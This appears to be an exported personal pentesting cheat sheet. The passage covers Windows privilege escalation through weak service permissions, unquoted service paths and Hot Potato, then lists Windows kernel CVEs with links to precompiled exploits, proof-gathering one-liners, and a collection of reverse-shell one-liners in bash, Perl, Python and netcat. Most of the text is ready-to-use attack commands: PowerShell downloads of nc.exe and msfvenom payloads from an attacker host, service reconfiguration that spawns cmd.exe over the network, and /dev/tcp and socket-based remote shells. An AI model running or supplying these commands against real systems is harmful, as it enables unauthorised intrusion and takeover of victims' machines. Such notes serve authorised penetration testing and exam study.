    daclsvc: WriteData/CreateFiles</pre><pre class="hljs"><code>winPEAS<span class="hljs-selector-class">.exe</span>

<span class="hljs-selector-attr">[+]</span> Interesting Services -non Microsoft-(T1007)

<span class="hljs-function"><span class="hljs-title">daclsvc</span><span class="hljs-params">(DACL Service)</span></span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;C:\Program Files\DACL Service\daclservice.exe&quot;</span>]</span> - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles

<span class="hljs-selector-attr">[+]</span> Modifiable Services(T1007)
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    daclsvc: WriteData/CreateFiles</code></pre></div>
<h5 id="exploitation-5">Exploitation</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Attacker
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/nc.exe', '.\nc.exe')
sc config &lt;SERVICENAME&gt; binpath= &quot;&lt;PATH&gt;\nc.exe &lt;IP&gt; &lt;PORT&gt; -e cmd.exe&quot;
sc start &lt;SERVICENAME&gt;
or 
net start &lt;SERVICENAME&gt;</pre><pre class="hljs"><code><span class="hljs-comment"># Attacker</span>
sudo python <span class="hljs-literal">-m</span> SimpleHTTPServer <span class="hljs-number">80</span>
sudo nc <span class="hljs-literal">-lvp</span> &lt;PORT&gt;

<span class="hljs-comment"># Victim</span>
powershell.exe (<span class="hljs-built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://&lt;IP&gt;/nc.exe&#x27;</span>, <span class="hljs-string">&#x27;.\nc.exe&#x27;</span>)
<span class="hljs-built_in">sc</span> config &lt;SERVICENAME&gt; binpath= <span class="hljs-string">&quot;&lt;PATH&gt;\nc.exe &lt;IP&gt; &lt;PORT&gt; -e cmd.exe&quot;</span>
<span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> &lt;SERVICENAME&gt;
or 
net <span class="hljs-built_in">start</span> &lt;SERVICENAME&gt;</code></pre></div>
<h4 id="unquoted-service-paths">Unquoted service paths</h4>
<h5 id="detection-6">Detection</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">powershell -exec bypass -command &quot;&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }&quot;

[*] Checking for unquoted service paths...

ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path &lt;HijackPath&gt;
CanRestart     : True

ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path &lt;HijackPath&gt;
CanRestart     : True</pre><pre class="hljs"><code><span class="hljs-variable">powershell</span> <span class="hljs-operator">-</span><span class="hljs-variable">exec</span> <span class="hljs-variable">bypass</span> <span class="hljs-operator">-</span><span class="hljs-variable">command</span> <span class="hljs-string">&quot;&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }&quot;</span>

<span class="hljs-punctuation">[</span><span class="hljs-operator">*</span><span class="hljs-punctuation">]</span> <span class="hljs-variable">Checking</span> <span class="hljs-variable">for</span> <span class="hljs-variable">unquoted</span> <span class="hljs-variable">service</span> <span class="hljs-variable">paths</span><span class="hljs-operator">...</span>

<span class="hljs-variable">ServiceName</span>    <span class="hljs-operator">:</span> <span class="hljs-variable">unquotedsvc</span>
<span class="hljs-built_in">Path</span>           <span class="hljs-operator">:</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Program</span> <span class="hljs-variable">Files</span>\<span class="hljs-variable">Unquoted</span> <span class="hljs-built_in">Path</span> <span class="hljs-variable">Service</span>\<span class="hljs-variable">Common</span> <span class="hljs-variable">Files</span>\<span class="hljs-variable">unquotedpathservice</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span>
<span class="hljs-variable">ModifiablePath</span> <span class="hljs-operator">:</span> <span class="hljs-operator">@</span><span class="hljs-punctuation">{</span><span class="hljs-built_in">Permissions</span><span class="hljs-operator">=</span><span class="hljs-variable">AppendData</span><span class="hljs-operator">/</span><span class="hljs-variable">AddSubdirectory</span><span class="hljs-operator">;</span> <span class="hljs-variable">ModifiablePath</span><span class="hljs-operator">=</span><span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-operator">;</span><span class="hljs-variable">IdentityReference</span><span class="hljs-operator">=</span><span class="hljs-variable">NT</span> <span class="hljs-variable">AUTHORITY</span>\<span class="hljs-variable">Authenticated</span> <span class="hljs-variable">Users</span><span class="hljs-punctuation">}</span>
<span class="hljs-variable">StartName</span>      <span class="hljs-operator">:</span> <span class="hljs-variable">LocalSystem</span>
<span class="hljs-variable">AbuseFunction</span>  <span class="hljs-operator">:</span> <span class="hljs-built_in">Write</span><span class="hljs-operator">-</span><span class="hljs-variable">ServiceBinary</span> <span class="hljs-operator">-</span><span class="hljs-variable">Name</span> <span class="hljs-operator">&#x27;</span><span class="hljs-variable">unquotedsvc</span><span class="hljs-operator">&#x27;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-operator">&lt;</span><span class="hljs-variable">HijackPath</span><span class="hljs-operator">&gt;</span>
<span class="hljs-variable">CanRestart</span>     <span class="hljs-operator">:</span> <span class="hljs-built_in">True</span>

<span class="hljs-variable">ServiceName</span>    <span class="hljs-operator">:</span> <span class="hljs-variable">unquotedsvc</span>
<span class="hljs-built_in">Path</span>           <span class="hljs-operator">:</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Program</span> <span class="hljs-variable">Files</span>\<span class="hljs-variable">Unquoted</span> <span class="hljs-built_in">Path</span> <span class="hljs-variable">Service</span>\<span class="hljs-variable">Common</span> <span class="hljs-variable">Files</span>\<span class="hljs-variable">unquotedpathservice</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span>
<span class="hljs-variable">ModifiablePath</span> <span class="hljs-operator">:</span> <span class="hljs-operator">@</span><span class="hljs-punctuation">{</span><span class="hljs-built_in">Permissions</span><span class="hljs-operator">=</span><span class="hljs-variable">System</span><span class="hljs-operator">.</span><span class="hljs-variable">Object</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-operator">;</span> <span class="hljs-variable">ModifiablePath</span><span class="hljs-operator">=</span><span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-operator">;</span> <span class="hljs-variable">IdentityReference</span><span class="hljs-operator">=</span><span class="hljs-variable">NT</span> <span class="hljs-variable">AUTHORITY</span>\<span class="hljs-variable">Authenticated</span> <span class="hljs-variable">Users</span><span class="hljs-punctuation">}</span>
<span class="hljs-variable">StartName</span>      <span class="hljs-operator">:</span> <span class="hljs-variable">LocalSystem</span>
<span class="hljs-variable">AbuseFunction</span>  <span class="hljs-operator">:</span> <span class="hljs-built_in">Write</span><span class="hljs-operator">-</span><span class="hljs-variable">ServiceBinary</span> <span class="hljs-operator">-</span><span class="hljs-variable">Name</span> <span class="hljs-operator">&#x27;</span><span class="hljs-variable">unquotedsvc</span><span class="hljs-operator">&#x27;</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Path</span> <span class="hljs-operator">&lt;</span><span class="hljs-variable">HijackPath</span><span class="hljs-operator">&gt;</span>
<span class="hljs-variable">CanRestart</span>     <span class="hljs-operator">:</span> <span class="hljs-built_in">True</span></code></pre></div>
<p>or</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected</pre><pre class="hljs"><code>winPEAS<span class="hljs-selector-class">.exe</span>

<span class="hljs-selector-attr">[+]</span> Interesting Services -non Microsoft-(T1007)

<span class="hljs-function"><span class="hljs-title">unquotedsvc</span><span class="hljs-params">(Unquoted Path Service)</span></span><span class="hljs-selector-attr">[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe]</span> - Manual - Stopped - No <span class="hljs-attribute">quotes</span> and Space detected</code></pre></div>
<h5 id="exploitation-6">Exploitation</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; Common.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
cd &quot;C:\Program Files\Unquoted Path Service\&quot;
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/Common.exe', '.\Common.exe')
sc start unquotedsvc</pre><pre class="hljs"><code># Attacker
msfvenom -<span class="hljs-keyword">p</span> windows/shell_reverse_tcp LHOST=<span class="hljs-symbol">&lt;IP&gt;</span> LPORT=<span class="hljs-symbol">&lt;PORT&gt;</span> -<span class="hljs-keyword">f</span> <span class="hljs-keyword">exe</span> &gt; Common.<span class="hljs-keyword">exe</span>
sudo <span class="hljs-keyword">python</span> -<span class="hljs-keyword">m</span> SimpleHTTPServer <span class="hljs-number">80</span>
sudo nc -lvp <span class="hljs-symbol">&lt;PORT&gt;</span>

# Victim
<span class="hljs-keyword">cd</span> <span class="hljs-string">&quot;C:\Program Files\Unquoted Path Service\&quot;</span>
powershell.<span class="hljs-keyword">exe</span> (New-Object System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://&lt;IP&gt;/Common.exe&#x27;</span>, <span class="hljs-string">&#x27;.\Common.exe&#x27;</span>)
sc start unquotedsvc</code></pre></div>
<h4 id="hot-potato">Hot potato</h4>
<h5 id="exploitation-7">Exploitation</h5>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Attacker
sudo python -m SimpleHTTPServer 80
sudo nc -lvp &lt;PORT&gt;

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/nc.exe', '.\nc.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/Tater.ps1.exe', '.\Tater.ps1.exe')
powershell -exec bypass -command &quot;&amp; { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe &lt;IP&gt; &lt;PORT&gt; -e cmd.exe' }&quot;</pre><pre class="hljs"><code># Attacker
sudo python -m SimpleHTTPServer <span class="hljs-number">80</span>
sudo nc -lvp &lt;PORT&gt;

# Victim
powershell.exe (New-Object System.Net.WebClient).<span class="hljs-constructor">DownloadFile(&#x27;<span class="hljs-params">http</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>&lt;IP&gt;<span class="hljs-operator">/</span><span class="hljs-params">nc</span>.<span class="hljs-params">exe</span>&#x27;, &#x27;.\<span class="hljs-params">nc</span>.<span class="hljs-params">exe</span>&#x27;)</span>
powershell.exe (New-Object System.Net.WebClient).<span class="hljs-constructor">DownloadFile(&#x27;<span class="hljs-params">http</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>&lt;IP&gt;<span class="hljs-operator">/</span>Tater.<span class="hljs-params">ps1</span>.<span class="hljs-params">exe</span>&#x27;, &#x27;.\Tater.<span class="hljs-params">ps1</span>.<span class="hljs-params">exe</span>&#x27;)</span>
powershell -exec bypass -command <span class="hljs-string">&quot;&amp; { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command &#x27;.\nc.exe &lt;IP&gt; &lt;PORT&gt; -e cmd.exe&#x27; }&quot;</span></code></pre></div>
<h4 id="cve">CVE</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Already compiled exploit
https://github.com/SecWiki/windows-kernel-exploits
https://github.com/abatchy17/WindowsExploits</pre><pre class="hljs"><code><span class="hljs-comment"># Already compiled exploit</span>
https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SecWiki/</span>windows-kernel-exploits
https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/abatchy17/</span>WindowsExploits</code></pre></div>
<h5 id="windows-xp">Windows XP</h5>
<table>
<thead>
<tr>
<th style="text-align:center">CVE</th>
<th style="text-align:left">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">CVE-2002-1214</td>
<td style="text-align:left">ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS</td>
</tr>
<tr>
<td style="text-align:center">CVE-2003-0352</td>
<td style="text-align:left">ms03_026_dcom - exploits a stack buffer overflow in the RPCSS service</td>
</tr>
<tr>
<td style="text-align:center">CVE-2003-0533</td>
<td style="text-align:left">MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service</td>
</tr>
<tr>
<td style="text-align:center">CVE-2003-0719</td>
<td style="text-align:left">ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow</td>
</tr>
<tr>
<td style="text-align:center">CVE-2003-0812</td>
<td style="text-align:left">ms03_049_netapi - exploits a stack buffer overflow in the NetApi32</td>
</tr>
<tr>
<td style="text-align:center">CVE-2003-0818</td>
<td style="text-align:left">ms04_007_killbill -  vulnerability in the bit string decoding code in the Microsoft ASN.1 library</td>
</tr>
<tr>
<td style="text-align:center">CVE-2003-0822</td>
<td style="text-align:left">ms03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051</td>
</tr>
<tr>
<td style="text-align:center">CVE-2004-0206</td>
<td style="text-align:left">ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service</td>
</tr>
<tr>
<td style="text-align:center">CVE-2010-3138</td>
<td style="text-align:left">EXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse</td>
</tr>
<tr>
<td style="text-align:center">CVE-2010-3147</td>
<td style="text-align:left">EXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse</td>
</tr>
<tr>
<td style="text-align:center">CVE-2010-3970</td>
<td style="text-align:left">ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution</td>
</tr>
<tr>
<td style="text-align:center">CVE-2011-1345</td>
<td style="text-align:left">Internet Explorer does not properly handle objects in memory - allows remote execution of code via object</td>
</tr>
<tr>
<td style="text-align:center">CVE-2011-5046</td>
<td style="text-align:left">EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution</td>
</tr>
<tr>
<td style="text-align:center">CVE-2012-4349</td>
<td style="text-align:left">Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root</td>
</tr>
</tbody>
</table>
<h5 id="windows-7">Windows 7</h5>
<table>
<thead>
<tr>
<th style="text-align:center">CVE</th>
<th style="text-align:left">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">CVE-2010-0232</td>
<td style="text-align:left">ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit</td>
</tr>
<tr>
<td style="text-align:center">CVE-2010-2568</td>
<td style="text-align:left">ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload</td>
</tr>
<tr>
<td style="text-align:center">CVE-2010-2744</td>
<td style="text-align:left">EXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalation</td>
</tr>
<tr>
<td style="text-align:center">CVE-2010-3227</td>
<td style="text-align:left">EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution</td>
</tr>
<tr>
<td style="text-align:center">CVE-2014-4113</td>
<td style="text-align:left">ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution</td>
</tr>
<tr>
<td style="text-align:center">CVE-2014-4114</td>
<td style="text-align:left">ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution</td>
</tr>
<tr>
<td style="text-align:center">CVE-2015-0016</td>
<td style="text-align:left">ms15_004_tswbproxy -  abuses a process creation policy in Internet Explorer's sandbox - code execution</td>
</tr>
<tr>
<td style="text-align:center">CVE-2018-8494</td>
<td style="text-align:left">remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input</td>
</tr>
</tbody>
</table>
<h5 id="windows-8">Windows 8</h5>
<table>
<thead>
<tr>
<th style="text-align:center">CVE</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">CVE-2013-0008</td>
<td>ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation</td>
</tr>
<tr>
<td style="text-align:center">CVE-2013-1300</td>
<td>ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation</td>
</tr>
<tr>
<td style="text-align:center">CVE-2013-3660</td>
<td>ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruption</td>
</tr>
<tr>
<td style="text-align:center">CVE-2013-3918</td>
<td>ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution</td>
</tr>
<tr>
<td style="text-align:center">CVE-2013-7331</td>
<td>ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine's filenames</td>
</tr>
<tr>
<td style="text-align:center">CVE-2014-6324</td>
<td>ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation</td>
</tr>
<tr>
<td style="text-align:center">CVE-2014-6332</td>
<td>ms14_064_ole_code_execution -  exploits the Windows OLE Automation array vulnerability</td>
</tr>
<tr>
<td style="text-align:center">CVE-2014-6352</td>
<td>ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution</td>
</tr>
<tr>
<td style="text-align:center">CVE-2015-0002</td>
<td>ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation</td>
</tr>
</tbody>
</table>
<h5 id="windows-10">Windows 10</h5>
<table>
<thead>
<tr>
<th style="text-align:center">CVE</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">CVE-2015-0057</td>
<td>exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine</td>
</tr>
<tr>
<td style="text-align:center">CVE-2015-1769</td>
<td>MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege</td>
</tr>
<tr>
<td style="text-align:center">CVE-2015-2426</td>
<td>ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver</td>
</tr>
<tr>
<td style="text-align:center">CVE-2015-2479</td>
<td>MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege</td>
</tr>
<tr>
<td style="text-align:center">CVE-2015-2513</td>
<td>MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution</td>
</tr>
<tr>
<td style="text-align:center">CVE-2015-2423</td>
<td>MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure</td>
</tr>
<tr>
<td style="text-align:center">CVE-2015-2431</td>
<td>MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution</td>
</tr>
<tr>
<td style="text-align:center">CVE-2015-2441</td>
<td>MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution</td>
</tr>
</tbody>
</table>
<h5 id="windows-server-2003">Windows Server 2003</h5>
<table>
<thead>
<tr>
<th style="text-align:center">CVE</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">CVE-2008-4250</td>
<td>ms08_067_netapi  - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX</td>
</tr>
<tr>
<td style="text-align:center">CVE-2017-8487</td>
<td>allows an attacker to execute code when a victim opens a specially crafted file - remote code execution</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="proofs">PROOFS</h2>
<h3 id="linux-6">Linux</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">echo &quot; &quot;;echo &quot;uname -a:&quot;;uname -a;echo &quot; &quot;;echo &quot;hostname:&quot;;hostname;echo &quot; &quot;;echo &quot;id&quot;;id;echo &quot; &quot;;echo &quot;ifconfig:&quot;;/sbin/ifconfig -a;echo &quot; &quot;;echo &quot;proof:&quot;;cat /root/proof.txt 2&gt;/dev/null; cat /Desktop/proof.txt 2&gt;/dev/null;echo &quot; &quot;</pre><pre class="hljs"><code>echo <span class="hljs-string">&quot; &quot;</span>;echo <span class="hljs-string">&quot;uname -a:&quot;</span>;uname -a;echo <span class="hljs-string">&quot; &quot;</span>;echo <span class="hljs-string">&quot;hostname:&quot;</span>;hostname;echo <span class="hljs-string">&quot; &quot;</span>;echo <span class="hljs-string">&quot;id&quot;</span>;id;echo <span class="hljs-string">&quot; &quot;</span>;echo <span class="hljs-string">&quot;ifconfig:&quot;</span>;<span class="hljs-regexp">/sbin/i</span>fconfig -a;echo <span class="hljs-string">&quot; &quot;</span>;echo <span class="hljs-string">&quot;proof:&quot;</span>;cat <span class="hljs-regexp">/root/</span>proof.txt <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>; cat <span class="hljs-regexp">/Desktop/</span>proof.txt <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span>;echo <span class="hljs-string">&quot; &quot;</span></code></pre></div>
<h3 id="windows-6">Windows</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">echo. &amp; echo. &amp; echo whoami: &amp; whoami 2&gt; nul &amp; echo %username% 2&gt; nul &amp; echo. &amp; echo Hostname: &amp; hostname &amp; echo. &amp; ipconfig /all &amp; echo. &amp; echo proof.txt: &amp;  type &quot;C:\Documents and Settings\Administrator\Desktop\proof.txt&quot;</pre><pre class="hljs"><code><span class="hljs-built_in">echo</span>. &amp; <span class="hljs-built_in">echo</span>. &amp; <span class="hljs-built_in">echo</span> whoami: &amp; whoami <span class="hljs-number">2</span>&gt; <span class="hljs-built_in">nul</span> &amp; <span class="hljs-built_in">echo</span> <span class="hljs-variable">%username%</span> <span class="hljs-number">2</span>&gt; <span class="hljs-built_in">nul</span> &amp; <span class="hljs-built_in">echo</span>. &amp; <span class="hljs-built_in">echo</span> Hostname: &amp; hostname &amp; <span class="hljs-built_in">echo</span>. &amp; <span class="hljs-built_in">ipconfig</span> /all &amp; <span class="hljs-built_in">echo</span>. &amp; <span class="hljs-built_in">echo</span> proof.txt: &amp;  <span class="hljs-built_in">type</span> &quot;C:\Documents and Settings\Administrator\Desktop\proof.txt&quot;</code></pre></div>
<hr>
<h2 id="reverse-shell">REVERSE SHELL</h2>
<h3 id="amazing-tool-for-shell-generation">Amazing tool for shell generation</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Download
git clone https://github.com/ShutdownRepo/shellerator

# Install requirements
pip3 install --user -r requirements.txt

# Executable from anywhere
sudo cp shellrator.py /bin/shellrator</pre><pre class="hljs"><code><span class="hljs-comment"># Download</span>
git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/ShutdownRepo/</span>shellerator

<span class="hljs-comment"># Install requirements</span>
pip3 install --user -r requirements.txt

<span class="hljs-comment"># Executable from anywhere</span>
sudo cp shellrator.py <span class="hljs-regexp">/bin/</span>shellrator</code></pre></div>
<h3 id="bash-2">Bash</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</pre><pre class="hljs"><code>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/&lt;IP&gt;/</span>&lt;PORT&gt; <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></code></pre></div>
<h3 id="perl-2">Perl</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">perl -e 'use Socket;$i=&quot;&lt;IP&gt;&quot;;$p=&lt;PORT&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'</pre><pre class="hljs"><code>perl -e &#x27;use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;&lt;IP&gt;&quot;</span>;<span class="hljs-variable">$p</span>=&lt;PORT&gt;;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>)))){<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/sh -i&quot;</span>);};&#x27;</code></pre></div>
<h3 id="python-2">Python</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;IP&gt;&quot;,&lt;PORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</pre><pre class="hljs"><code>python -c &#x27;import socket,subprocess,<span class="hljs-keyword">os</span>;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;&lt;IP&gt;&quot;</span>,<span class="hljs-variable">&lt;PORT&gt;</span>));<span class="hljs-keyword">os</span>.dup2(s.fileno(),<span class="hljs-number">0</span>); <span class="hljs-keyword">os</span>.dup2(s.fileno(),<span class="hljs-number">1</span>); <span class="hljs-keyword">os</span>.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27;</code></pre></div>
<h3 id="netcat-2">Netcat</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f</pre><pre class="hljs"><code>rm <span class="hljs-regexp">/tmp/</span>f;mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f|<span class="hljs-regexp">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc &lt;IP&gt; &lt;PORT&gt; &gt;<span class="hljs-regexp">/tmp/</span>f</code></pre></div>
<h3 id="more-reverse-shell">More reverse shell</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</pre><pre class="hljs"><code>http:<span class="hljs-regexp">//</span>pentestmonkey.net<span class="hljs-regexp">/cheat-sheet/</span>shells/reverse-shell-cheat-sheet</code></pre></div>
<h3 id="interactive-shell">Interactive shell</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Python
python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'

# Bash
echo os.system('/bin/bash')

# Sh
/bin/bash -i

# Perl
perl -e 'exec &quot;/bin/bash&quot;'

# Ruby
exec &quot;/bin/bash&quot;

# Lua
os.execute('/bin/bash')</pre><pre class="hljs"><code><span class="hljs-comment"># Python</span>
python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>
python3 -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>

<span class="hljs-comment"># Bash</span>
echo os.system(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)

<span class="hljs-comment"># Sh</span>
<span class="hljs-regexp">/bin/</span>bash -i

<span class="hljs-comment"># Perl</span>
